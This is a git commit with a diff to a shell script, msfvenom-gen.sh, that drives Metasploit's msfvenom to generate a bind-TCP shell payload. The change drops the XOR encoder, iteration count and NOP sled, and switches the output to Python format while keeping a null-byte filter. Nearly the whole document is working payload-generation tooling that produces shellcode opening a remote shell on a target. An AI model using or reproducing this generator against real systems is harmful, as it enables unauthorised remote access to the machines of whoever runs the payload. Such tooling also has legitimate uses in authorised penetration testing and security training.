5b08af9ee3abf36378477349fa518c915199d56c
Simone Gentili <gensimone.git@gmail.com>
2026-06-25 12:15:17 +0200

    Update msfvenom-gen.sh

--- msfvenom-gen.sh
+++ msfvenom-gen.sh
@@ -6,13 +6,11 @@ ENCODER="$ARCH/xor"
 PAYLOAD="$PLATFROM/$ARCH/shell/bind_tcp"
 ITERATIONS=3
 BAD_CHARS="\\x00"
-NOPSLED="40"
+FORMAT="python"
 
 msfvenom \
     --platform   $PLATFROM   \
     --arch       $ARCH       \
-    --encoder    $ENCODER    \
     --payload    $PAYLOAD    \
-    --iterations $ITERATIONS \
     --bad-chars  $BAD_CHARS  \
-    --nopsled    $NOPSLED    \
+    --format     $FORMAT
